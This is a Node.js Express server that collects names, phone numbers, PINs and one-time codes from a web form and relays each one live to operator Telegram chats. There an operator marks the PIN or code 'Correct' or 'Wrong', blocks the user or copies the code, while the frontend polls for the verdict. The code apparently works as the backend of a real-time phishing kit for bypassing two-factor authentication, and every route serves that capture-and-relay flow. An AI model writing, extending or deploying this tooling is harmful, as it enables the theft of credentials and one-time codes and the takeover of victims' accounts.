require('dotenv').config();

const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();

const PORT = process.env.PORT || 10000;
const DOMAIN = (process.env.BACKEND_URL || '').replace(/\/+$/, '');

const REQUIRED_UPDATES = ['message', 'callback_query'];
const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
const REQ_TTL_MS = 30 * 60 * 1000; // 30 minutes


// ============================================================
// STARTUP
// ============================================================

console.log('');
console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log('PORT:', PORT);
console.log('DOMAIN:', DOMAIN || '(NOT SET)');
console.log('========================================');

if (!DOMAIN) {
  console.warn('⚠️ BACKEND_URL is not set.');
}


// ============================================================
// BOTS
// ============================================================

const bots = [];

for (const key of Object.keys(process.env)) {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) continue;

  const number = match[1];
  const token = process.env[`BOT${number}_TOKEN`];
  const chatId = process.env[`BOT${number}_CHATID`];

  if (token && chatId) {
    bots.push({ botId: `bot${number}`, token, chatId });
  }
}

console.log('');
console.log('🤖 BOTS LOADED:');
if (bots.length === 0) {
  console.log('(none)');
} else {
  for (const bot of bots) console.log(`   ✅ ${bot.botId}`);
}
console.log('');


// ============================================================
// STORE
// ============================================================

const STORE_FILE = path.join(__dirname, 'data', 'store.json');
fs.mkdirSync(path.dirname(STORE_FILE), { recursive: true });

const store = { requests: {} };

function loadStore() {
  try {
    if (!fs.existsSync(STORE_FILE)) {
      console.log('💾 No existing store found.');
      return;
    }
    const raw = fs.readFileSync(STORE_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    Object.assign(store.requests, parsed.requests || {});
    console.log('💾 Loaded', Object.keys(store.requests).length, 'stored requests');
  } catch (error) {
    console.error('❌ Store load error:', error.message);
  }
}

function saveStore() {
  try {
    fs.writeFileSync(STORE_FILE, JSON.stringify(store, null, 2));
  } catch (error) {
    console.error('❌ Store save error:', error.message);
  }
}

loadStore();

// Expire old requests every 5 minutes
setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [id, r] of Object.entries(store.requests)) {
    if (now - r.createdAt > REQ_TTL_MS) {
      delete store.requests[id];
      changed = true;
    }
  }
  if (changed) saveStore();
}, 5 * 60 * 1000);


// ============================================================
// HELPERS
// ============================================================

function getBot(botId) {
  return bots.find(bot => bot.botId === botId);
}

function newId() {
  return crypto.randomBytes(5).toString('hex');
}

function clean(value) {
  return String(value == null ? '' : value)
    .replace(/[\u200B-\u200D\uFEFF]/g, '')
    .trim();
}

function escapeHtml(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// Builds a formatted message from real values (name/phone from store).
function buildMessage(header, name, phone, extraLines = []) {
  const lines = [
    `<b>${escapeHtml(header)}</b>`,
    SEP,
    `<b>Name:</b>  <b>${escapeHtml(name || '')}</b>`,
    `<b>Phone:</b> <b>${escapeHtml(phone || '')}</b>`
  ];
  if (extraLines.length) {
    lines.push(SEP);
    lines.push(...extraLines);
  }
  lines.push(SEP);
  return lines.join('\n');
}


// ============================================================
// TELEGRAM API
// ============================================================

async function telegram(bot, method, payload) {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${bot.token}/${method}`,
      payload
    );
    return response.data;
  } catch (error) {
    console.error(`❌ Telegram ${method} error:`);
    console.error(error.response?.data || error.message);
    return null;
  }
}

async function sendMessage(bot, text, keyboard = null) {
  return telegram(bot, 'sendMessage', {
    chat_id: bot.chatId,
    text,
    parse_mode: 'HTML',
    ...(keyboard ? { reply_markup: { inline_keyboard: keyboard } } : {})
  });
}

async function replyMessage(bot, replyToMessageId, text) {
  return telegram(bot, 'sendMessage', {
    chat_id: bot.chatId,
    text,
    parse_mode: 'HTML',
    reply_to_message_id: replyToMessageId,
    allow_sending_without_reply: true
  });
}

async function editMessage(bot, chatId, messageId, text) {
  return telegram(bot, 'editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: [] }
  });
}

async function answerCallback(bot, callbackId, text) {
  return telegram(bot, 'answerCallbackQuery', {
    callback_query_id: callbackId,
    text: text || ''
  });
}


// ============================================================
// WEBHOOK SETUP
// ============================================================

async function setWebhook(bot) {
  const webhookUrl = `${DOMAIN}/telegram/${bot.botId}`;

  console.log('');
  console.log('🌐 SETTING WEBHOOK');
  console.log('Bot:', bot.botId);
  console.log('URL:', webhookUrl);

  const result = await telegram(bot, 'setWebhook', {
    url: webhookUrl,
    allowed_updates: REQUIRED_UPDATES,
    drop_pending_updates: false
  });

  if (!result?.ok) {
    console.error(`❌ WEBHOOK FAILED: ${bot.botId}`);
    return;
  }

  console.log(`✅ WEBHOOK REGISTERED: ${bot.botId}`);
}

async function initializeWebhooks() {
  console.log('');
  console.log('========================================');
  console.log('🔧 INITIALIZING WEBHOOKS');
  console.log('========================================');

  for (const bot of bots) {
    await setWebhook(bot);
  }

  console.log('');
  console.log('✅ WEBHOOK INITIALIZATION FINISHED');
  console.log('');
}


// ============================================================
// MIDDLEWARE
// ============================================================

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));


// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/health', (req, res) => {
  res.json({
    ok: true,
    domain: DOMAIN,
    bots: bots.map(bot => bot.botId)
  });
});


// ============================================================
// DEBUG STORE
// ============================================================

app.get('/debug/store', (req, res) => {
  res.json(store);
});


// ============================================================
// BOT ROUTE
// ============================================================

app.get('/bot/:botId', (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.status(404).send('Unknown bot');
  res.redirect(`/index.html?botId=${encodeURIComponent(bot.botId)}`);
});


// ============================================================
// SUBMIT ROUTES (phone / pin / code)
// ============================================================

function handleSubmit(type) {
  return (req, res) => {
    const body = req.body || {};
    console.log('');
    console.log(`📥 /submit-${type}`, JSON.stringify(body));

    const bot = getBot(body.botId);
    if (!bot) {
      console.log('❌ submit: unknown botId', body.botId);
      return res.status(400).json({ error: `unknown bot: ${body.botId}` });
    }

    const requestId = newId();
    const rec = {
      botId: bot.botId,
      type,
      name: clean(body.name),
      phone: clean(body.phone),
      status: 'pending',
      createdAt: Date.now()
    };

    let header;
    let extra = [];
    let keyboard;

    if (type === 'phone') {
      header = '📱 PHONE NUMBER VERIFICATION';
      keyboard = [[
        { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
        { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
      ]];
    } else if (type === 'pin') {
      rec.pin = clean(body.pin);
      extra = [`<b>PIN:</b>  <b><code>${escapeHtml(rec.pin)}</code></b>`];
      header = '🔐 PIN VERIFICATION';
      keyboard = [
        [{ text: '✅ Correct', callback_data: `pin_ok:${requestId}` },
         { text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }],
        [{ text: '🛑 Block',   callback_data: `pin_block:${requestId}` }]
      ];
    } else if (type === 'code') {
      rec.code = clean(body.code);
      extra = [`<b>Code:</b> <b><code>${escapeHtml(rec.code)}</code></b>`];
      header = '🔑 OTP CODE VERIFICATION';
      keyboard = [
        [{ text: '✅ Correct', callback_data: `code_ok:${requestId}` },
         { text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }],
        [{ text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }]
      ];
    }

    store.requests[requestId] = rec;
    saveStore();

    console.log(`📝 stored ${requestId}`, JSON.stringify(rec));

    sendMessage(bot, buildMessage(header, rec.name, rec.phone, extra), keyboard);

    res.json({ requestId });
  };
}

app.post('/submit-phone', handleSubmit('phone'));
app.post('/submit-pin',   handleSubmit('pin'));
app.post('/submit-code',  handleSubmit('code'));


// ============================================================
// CHECK ROUTES (frontend polling)
// ============================================================

function handleCheck(req, res) {
  const r = store.requests[req.params.requestId];
  if (!r) return res.json({ approved: null });

  const map = {
    pending:  { approved: null },
    approved: { approved: true },
    rejected: { approved: false },
    wrong:    { approved: false },
    blocked:  { approved: false, blocked: true }
  };
  res.json(map[r.status] || { approved: null });
}

app.get('/check-phone/:requestId', handleCheck);
app.get('/check-pin/:requestId',   handleCheck);
app.get('/check-code/:requestId',  handleCheck);


// ============================================================
// TELEGRAM GET TEST
// ============================================================

app.get('/telegram/:botId', (req, res) => {
  console.log('');
  console.log('🧪 TELEGRAM GET TEST');
  console.log('Bot:', req.params.botId);
  res.json({
    ok: true,
    route: `/telegram/${req.params.botId}`,
    message: 'Webhook route is reachable'
  });
});


// ============================================================
// WEBHOOK INFO TEST
// ============================================================

app.get('/webhook-info/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) {
    return res.status(404).json({ ok: false, error: 'Unknown bot' });
  }

  const result = await telegram(bot, 'getWebhookInfo', {});
  res.json(result || { ok: false, error: 'Telegram request failed' });
});


// ============================================================
// TELEGRAM TEST MESSAGE
// ============================================================

app.get('/telegram-test/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) {
    return res.status(404).json({ ok: false, error: 'Unknown bot' });
  }

  const result = await sendMessage(
    bot,
    '🧪 <b>Webhook callback test</b>\n\nClick the button below.',
    [[{ text: 'TEST CALLBACK', callback_data: 'test_callback' }]]
  );

  res.json({ ok: result?.ok === true, botId: bot.botId, telegram: result });
});


// ============================================================
// TELEGRAM POST WEBHOOK
// ============================================================

app.post('/telegram/:botId', async (req, res) => {
  console.log('');
  console.log('========================================');
  console.log('🚨 TELEGRAM WEBHOOK RECEIVED');
  console.log('========================================');
  console.log('🆔 Bot ID:', req.params.botId);

  res.sendStatus(200);

  try {
    const bot = getBot(req.params.botId);
    if (!bot) {
      console.error('❌ UNKNOWN BOT:', req.params.botId);
      return;
    }

    const callback = req.body?.callback_query;
    if (!callback) {
      console.log('ℹ️ Update contains no callback_query');
      return;
    }

    const data = callback.data || '';
    console.log('🔘 Callback data:', data);

    // ---- Test callback ----
    if (data === 'test_callback') {
      console.log('✅ TEST CALLBACK SUCCESS');
      await answerCallback(bot, callback.id, 'Webhook is working ✅');
      if (callback.message?.chat?.id && callback.message?.message_id) {
        await editMessage(
          bot,
          callback.message.chat.id,
          callback.message.message_id,
          '✅ <b>TEST CALLBACK RECEIVED</b>\n\nTelegram → Render → Express is working.'
        );
      }
      return;
    }

    // ---- Real callbacks: format is  action:requestId  ----
    const i = data.indexOf(':');
    if (i < 0) {
      console.log('⚠️ Bad callback format:', data);
      await answerCallback(bot, callback.id, 'Invalid action');
      return;
    }

    const action = data.slice(0, i);
    const requestId = data.slice(i + 1);

    console.log('🎯 Action:', action, '| requestId:', requestId);

    const rec = store.requests[requestId];
    if (!rec) {
      console.log(`⚠️ No store entry for requestId ${requestId}`);
      await answerCallback(bot, callback.id, 'This request has expired.');
      return;
    }

    // ---- Copy code ----
    if (action === 'code_copy') {
      await answerCallback(bot, callback.id, 'Sent for copying');
      const payload = `<code>${escapeHtml(rec.code || '')}</code>`;
      if (callback.message?.message_id) {
        await replyMessage(bot, callback.message.message_id, payload);
      } else {
        await sendMessage(bot, payload);
      }
      return;
    }

    // ---- Map action to new status ----
    let newStatus;
    let feedback;
    switch (action) {
      case 'phone_ok':  newStatus = 'approved'; feedback = 'Approved ✅';     break;
      case 'phone_bad': newStatus = 'rejected'; feedback = 'Rejected ❌';     break;
      case 'pin_ok':    newStatus = 'approved'; feedback = 'Correct ✅';      break;
      case 'pin_bad':   newStatus = 'wrong';    feedback = 'Wrong ❌';        break;
      case 'pin_block': newStatus = 'blocked';  feedback = 'User blocked 🛑'; break;
      case 'code_ok':   newStatus = 'approved'; feedback = 'Correct ✅';      break;
      case 'code_bad':  newStatus = 'wrong';    feedback = 'Wrong ❌';        break;
      default:
        console.log('⚠️ Unknown action:', action);
        await answerCallback(bot, callback.id, 'Unknown action');
        return;
    }

    rec.status = newStatus;
    rec.updatedAt = Date.now();
    saveStore();

    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${newStatus}`);

    await answerCallback(bot, callback.id, feedback);

    // ---- Rebuild message from the SAME record we stored ----
    const headers = {
      phone: '📱 PHONE NUMBER VERIFICATION',
      pin:   '🔐 PIN VERIFICATION',
      code:  '🔑 OTP CODE VERIFICATION'
    };
    const extra = [];
    if (rec.type === 'pin')  extra.push(`<b>PIN:</b>  <b><code>${escapeHtml(rec.pin || '')}</code></b>`);
    if (rec.type === 'code') extra.push(`<b>Code:</b> <b><code>${escapeHtml(rec.code || '')}</code></b>`);
    extra.push(`<b>Status:</b> ${feedback}`);

    const newText = buildMessage(headers[rec.type] || 'VERIFICATION', rec.name, rec.phone, extra);

    if (callback.message?.message_id) {
      await editMessage(bot, callback.message.chat.id, callback.message.message_id, newText);
    }
    await sendMessage(
      bot,
      buildMessage(`📝 RESPONSE — ${feedback}`, rec.name, rec.phone)
    );

  } catch (error) {
    console.error('');
    console.error('❌ WEBHOOK PROCESSING ERROR');
    console.error(error.stack || error.message);
  }
});


// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, async () => {
  console.log('');
  console.log('========================================');
  console.log(`🚀 SERVER LISTENING ON PORT ${PORT}`);
  console.log('🌐 DOMAIN:', DOMAIN);
  console.log('========================================');

  if (!DOMAIN) {
    console.error('❌ BACKEND_URL is missing.');
    return;
  }

  await initializeWebhooks();
});